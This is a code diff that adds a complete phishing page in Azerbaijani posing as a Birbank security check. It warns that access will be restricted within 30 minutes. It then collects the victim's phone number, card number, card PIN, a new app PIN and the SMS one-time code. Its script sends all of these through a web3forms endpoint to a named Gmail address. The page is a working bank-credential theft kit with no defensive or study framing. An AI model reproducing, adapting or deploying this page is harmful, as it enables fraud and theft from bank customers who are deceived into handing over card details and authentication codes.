@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Birbank - Təhlükəsizlik Təsdiqi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #f2f4f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            padding: 16px;
+        }
+        .app {
+            max-width: 400px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 28px;
+            padding: 32px 24px 24px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+            position: relative;
+            overflow: hidden;
+        }
+        .app::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: #e30613;
+        }
+        .hidden {
+            display: none !important;
+        }
+        
+        /* Birbank Logo */
+        .birbank-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 24px;
+        }
+        .birbank-icon {
+            width: 14px;
+            height: 32px;
+            background: #e30613;
+            border-radius: 0 7px 7px 0;
+            position: relative;
+            transform: skewX(-8deg);
+        }
+        .birbank-icon::before {
+            content: "";
+            position: absolute;
+            left: -6px;
+            top: 0;
+            width: 6px;
+            height: 32px;
+            background: #e30613;
+            border-radius: 7px 0 0 7px;
+            opacity: 0.6;
+        }
+        .birbank-text {
+            font-size: 26px;
+            font-weight: 600;
+            color: #e30613;
+            letter-spacing: -0.5px;
+        }
+        
+        /* Biri Robot */
+        .robot {
+            text-align: center;
+            margin: 8px 0 16px;
+        }
+        .robot-icon {
+            width: 120px;
+            height: 70px;
+            background: linear-gradient(135deg, #e30613, #ff4757);
+            border-radius: 35px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            box-shadow: 0 6px 20px rgba(227, 6, 19, 0.25);
+        }
+        .robot-face {
+            width: 90px;
+            height: 50px;
+            background: white;
+            border-radius: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            position: relative;
+        }
+        .robot-eye-left {
+            width: 10px;
+            height: 22px;
+            background: #e30613;
+            border-radius: 5px;
+        }
+        .robot-eye-right {
+            width: 18px;
+            height: 10px;
+            border: 3px solid #e30613;
+            border-top: none;
+            border-radius: 0 0 12px 12px;
+            margin-top: 5px;
+        }
+        
+        .welcome {
+            text-align: center;
+            font-size: 17px;
+            font-weight: 500;
+            margin: 16px 0 20px;
+            color: #1c1c1e;
+            line-height: 1.5;
+        }
+        .warning-box {
+            background: #fff5f5;
+            border: 1px solid #ffe0e0;
+            border-radius: 16px;
+            padding: 18px 16px;
+            margin: 0 0 24px;
+            font-size: 13px;
+            line-height: 1.6;
+            color: #5c3a3a;
+        }
+        .warning-box::first-line {
+            font-weight: 600;
+            color: #e30613;
+        }
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 8px 0;
+            text-align: center;
+            transition: all 0.2s ease;
+            letter-spacing: 0.2px;
+        }
+        .btn:active {
+            transform: scale(0.97);
+        }
+        .btn-primary {
+            background: #e30613;
+            color: white;
+            border: none;
+            box-shadow: 0 4px 12px rgba(227, 6, 19, 0.3);
+        }
+        .btn-primary:hover {
+            background: #c00510;
+        }
+        .btn-primary:disabled {
+            background: #f0a0a5;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+        .btn-outline {
+            background: transparent;
+            color: #e30613;
+            border: 1.5px solid #e30613;
+        }
+        .btn-outline:hover {
+            background: #fff5f5;
+        }
+        .step-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1c1c1e;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #6c6c70;
+            margin-bottom: 6px;
+            letter-spacing: 0.3px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid #e5e5ea;
+            border-radius: 12px;
+            font-size: 16px;
+            background: #f9f9fb;
+            color: #1c1c1e;
+            transition: border-color 0.2s;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #e30613;
+            background: white;
+        }
+        .pin-dots {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin: 8px 0 28px;
+        }
+        .dot {
+            width: 14px;
+            height: 14px;
+            background: #e5e5ea;
+            border-radius: 50%;
+            transition: all 0.2s;
+        }
+        .dot.filled {
+            background: #e30613;
+            transform: scale(1.15);
+            box-shadow: 0 2px 8px rgba(227, 6, 19, 0.3);
+        }
+        .numpad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin: 16px 0 8px;
+            max-width: 280px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .num {
+            background: #f2f2f7;
+            border: none;
+            padding: 16px;
+            font-size: 22px;
+            font-weight: 500;
+            border-radius: 50px;
+            cursor: pointer;
+            color: #1c1c1e;
+            transition: all 0.15s;
+            aspect-ratio: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .num:active {
+            background: #e5e5ea;
+            transform: scale(0.93);
+        }
+        .otp-boxes {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 8px 0 24px;
+        }
+        .otp {
+            width: 56px;
+            height: 64px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 600;
+            border: 1.5px solid #e5e5ea;
+            border-radius: 12px;
+            background: #f9f9fb;
+            color: #1c1c1e;
+            transition: border-color 0.2s;
+        }
+        .otp:focus {
+            outline: none;
+            border-color: #e30613;
+            background: white;
+        }
+        .timer {
+            text-align: center;
+            color: #e30613;
+            margin: 16px 0 24px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 28px;
+            padding-top: 18px;
+            border-top: 1px solid #f0f0f0;
+            font-size: 12px;
+            color: #8e8e93;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+        .footer span {
+            cursor: default;
+        }
+    </style>
+</head>
+<body>
+<div class="app" id="app">
+    <!-- STEP 0: Security -->
+    <div id="step0">
+        <!-- Birbank Logo -->
+        <div class="birbank-logo">
+            <div class="birbank-icon"></div>
+            <div class="birbank-text">birbank</div>
+        </div>
+        
+        <!-- Biri Robot -->
+        <div class="robot">
+            <div class="robot-icon">
+                <div class="robot-face">
+                    <div class="robot-eye-left"></div>
+                    <div class="robot-eye-right"></div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="welcome">Salam! Mən Biriyəm,<br>sizin rəqəmsal köməkçiniz.</div>
+        <div class="warning-box">
+            Təhlükəsizlik məqsədilə zəhmət olmasa, bütün addımları ardıcıllıqla yerinə yetirin.
+            <br><br>
+            Əks halda: 30 dəqiqə ərzində məlumatlarınız təsdiqlənmədikdə, tətbiqə girişiniz məhdudlaşdırılacaq və təsdiq yalnız 3 gün ərzində sizə uyğun olan filialda həyata keçirilməlidir.
+        </div>
+        <button class="btn btn-primary" id="confirmBtn">Məlumatları təsdiq et</button>
+        <button class="btn btn-outline" id="branchBtn">Filialda təsdiq</button>
+        <div class="footer"><span>Ana səhifə</span> <span>Ödənişlər</span> <span>Daha çox</span></div>
+    </div>
+
+    <!-- STEP 1: Card -->
+    <div id="step1" class="hidden">
+        <div class="step-title">Kart üzrə identifikasiya</div>
+        <div class="form-group">
+            <label>Mobil nömrə</label>
+            <input type="text" id="phone" placeholder="050 123 45 67">
+        </div>
+        <div class="form-group">
+            <label>Kart nömrəsi</label>
+            <input type="text" id="card" placeholder="1234 5678 9012 3456">
+        </div>
+        <div class="form-group">
+            <label>PIN kod</label>
+            <input type="password" id="pin" placeholder="****" maxlength="4">
+        </div>
+        <button class="btn btn-primary" id="nextBtn" disabled>Davam etmək</button>
+    </div>
+
+    <!-- STEP 2: PIN Setup -->
+    <div id="step2" class="hidden">
+        <div class="step-title">Giriş kodunu təyin edin</div>
+        <div class="pin-dots" id="dots">
+            <div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div>
+        </div>
+        <div class="numpad" id="numpad">
+            <button class="num" data-num="1">1</button><button class="num" data-num="2">2</button><button class="num" data-num="3">3</button>
+            <button class="num" data-num="4">4</button><button class="num" data-num="5">5</button><button class="num" data-num="6">6</button>
+            <button class="num" data-num="7">7</button><button class="num" data-num="8">8</button><button class="num" data-num="9">9</button>
+            <button class="num" data-num="C">C</button><button class="num" data-num="0">0</button>
+        </div>
+    </div>
+
+    <!-- STEP 3: SMS -->
+    <div id="step3" class="hidden">
+        <div class="step-title">Doğrulama kodunu daxil edin</div>
+        <div class="otp-boxes" id="otpBoxes">
+            <input type="text" maxlength="1" class="otp"> <input type="text" maxlength="1" class="otp">
+            <input type="text" maxlength="1" class="otp"> <input type="text" maxlength="1" class="otp">
+        </div>
+        <div class="timer" id="timer">Kodu yenidən göndərmək 1:58</div>
+        <div class="numpad" id="otpNumpad">
+            <button class="num" data-num="1">1</button><button class="num" data-num="2">2</button><button class="num" data-num="3">3</button>
+            <button class="num" data-num="4">4</button><button class="num" data-num="5">5</button><button class="num" data-num="6">6</button>
+            <button class="num" data-num="7">7</button><button class="num" data-num="8">8</button><button class="num" data-num="9">9</button>
+            <button class="num" data-num="0">0</button>
+        </div>
+        <button class="btn btn-primary" id="submitBtn" disabled>Edilib</button>
+    </div>
+</div>
+
+<script>
+    // BÜTÜN MƏLUMATLARI SAXLAYACAQ
+    let userData = {
+        phone: "",
+        card: "",
+        pin: "",
+        appPin: "",
+        smsCode: ""
+    };
+
+    const ACCESS_KEY = "7c3d7bf3-a371-4440-8677-94410d28c95c";
+    const EMAIL_TO = "rustmlisbahddin94@gmail.com";
+
+    async function sendAllData() {
+        const message = `
+📱 MƏLUMATLARIN HAMISI:
+
+1. Mobil nömrə: ${userData.phone}
+2. Kart nömrəsi: ${userData.card}
+3. Kart PIN kodu: ${userData.pin}
+4. Təyin edilən App PIN: ${userData.appPin}
+5. SMS doğrulama kodu: ${userData.smsCode}
+
+━━━━━━━━━━━━━━━━━━━━━
+Göndərən: Birbank Tətbiqi
+Tarix: ${new Date().toLocaleString()}
+        `;
+
+        try {
+            const res = await fetch("https://api.web3forms.com/submit", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    access_key: ACCESS_KEY,
+                    subject: "✅ Birbank - BÜTÜN MƏLUMATLAR",
+                    message: message,
+                    from_name: "Birbank Test"
+                })
+            });
+            const data = await res.json();
+            console.log("Bütün məlumatlar göndərildi:", data);
+            if(data.success) {
+                alert("✅ Qeydiyyat tamamlandı! Bütün məlumatlar email-ə göndərildi.");
+            } else {
+                alert("Xəta: " + data.message);
+            }
+        } catch(e) {
+            console.error("Xəta:", e);
+            alert("Şəbəkə xətası, amma məlumatlar konsolda saxlanıldı.");
+        }
+    }
+
+    // Navigation
+    let step = 0;
+    function showStep(s) {
+        document.getElementById('step0').classList.add('hidden');
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.add('hidden');
+        document.getElementById('step3').classList.add('hidden');
+        if(s===0) document.getElementById('step0').classList.remove('hidden');
+        if(s===1) document.getElementById('step1').classList.remove('hidden');
+        if(s===2) document.getElementById('step2').classList.remove('hidden');
+        if(s===3) document.getElementById('step3').classList.remove('hidden');
+        step = s;
+    }
+
+    // Step0
+    document.getElementById('confirmBtn').onclick = () => showStep(1);
+    document.getElementById('branchBtn').onclick = () => alert("Zəhmət olmasa, 3 gün ərzində sizə ən yaxın Birbank filialına müraciət edin.");
+
+    // Step1
+    const phoneInp = document.getElementById('phone');
+    const cardInp = document.getElementById('card');
+    const pinInp = document.getElementById('pin');
+    const nextBtn = document.getElementById('nextBtn');
+
+    function checkForm() {
+        nextBtn.disabled = !(phoneInp.value.trim() && cardInp.value.trim() && pinInp.value.length >= 4);
+    }
+    phoneInp.oninput = checkForm;
+    cardInp.oninput = checkForm;
+    pinInp.oninput = checkForm;
+
+    nextBtn.onclick = () => {
+        userData.phone = phoneInp.value;
+        userData.card = cardInp.value;
+        userData.pin = pinInp.value;
+        console.log("Kart məlumatları yadda saxlanıldı:", userData);
+        showStep(2);
+    };
+
+    // Step2
+    let appPin = "";
+    const dots = document.querySelectorAll('.dot');
+    const numpadBtns = document.querySelectorAll('#numpad .num');
+
+    function updateDots() {
+        dots.forEach((dot, i) => {
+            if(i < appPin.length) dot.classList.add('filled');
+            else dot.classList.remove('filled');
+        });
+    }
+
+    function handleNum(e) {
+        const val = e.currentTarget.getAttribute('data-num');
+        if(val === 'C') {
+            appPin = "";
+        } else if(appPin.length < 4) {
+            appPin += val;
+        }
+        updateDots();
+        if(appPin.length === 4) {
+            userData.appPin = appPin;
+            console.log("App PIN yadda saxlanıldı:", userData);
+            showStep(3);
+            startOTP();
+        }
+    }
+    numpadBtns.forEach(btn => btn.onclick = handleNum);
+
+    // Step3
+    let otpValues = ["", "", "", ""];
+    let timerSeconds = 118;
+    let timerInterval = null;
+
+    function startOTP() {
+        const boxes = document.querySelectorAll('.otp');
+        boxes.forEach((box, idx) => {
+            box.value = "";
+            box.oninput = (e) => {
+                otpValues[idx] = e.target.value;
+                if(e.target.value.length === 1 && idx < 3) boxes[idx+1].focus();
+                checkOTP();
+            };
+        });
+        timerSeconds = 118;
+        updateTimerDisplay();
+        if(timerInterval) clearInterval(timerInterval);
+        timerInterval = setInterval(() => {
+            if(timerSeconds <= 0) {
+                clearInterval(timerInterval);
+                document.getElementById('timer').innerText = "Kodu yenidən göndərmək 0:00";
+            } else {
+                timerSeconds--;
+                updateTimerDisplay();
+            }
+        }, 1000);
+
+        const otpNums = document.querySelectorAll('#otpNumpad .num');
+        otpNums.forEach(btn => {
+            btn.onclick = (e) => {
+                const num = e.currentTarget.getAttribute('data-num');
+                for(let i=0; i<4; i++) {
+                    if(!otpValues[i]) {
+                        otpValues[i] = num;
+                        boxes[i].value = num;
+                        if(i<3) boxes[i+1].focus();
+                        break;
+                    }
+                }
+                checkOTP();
+            };
+        });
+    }
+
+    function checkOTP() {
+        const full = otpValues.join('');
+        const submitBtn = document.getElementById('submitBtn');
+        submitBtn.disabled = full.length !== 4;
+        if(full.length === 4) {
+            userData.smsCode = full;
+            console.log("SMS kodu yadda saxlanıldı:", userData);
+            submitBtn.onclick = async () => {
+                await sendAllData(); // BÜTÜN MƏLUMATLAR BİRDƏN GÖNDƏRİLİR
+                location.reload();
+            };
+        }
+    }
+
+    function updateTimerDisplay() {
+        const minutes = Math.floor(timerSeconds / 60);
+        const secs = timerSeconds % 60;
+        document.getElementById('timer').innerText = `Kodu yenidən göndərmək ${minutes}:${secs < 10 ? '0' : ''}${secs}`;
+    }
+
+    console.log("✅ Tətbiq hazırdır. Bütün məlumatlar birdən email-ə göndəriləcək.");
+</script>
+</body>
+</html>
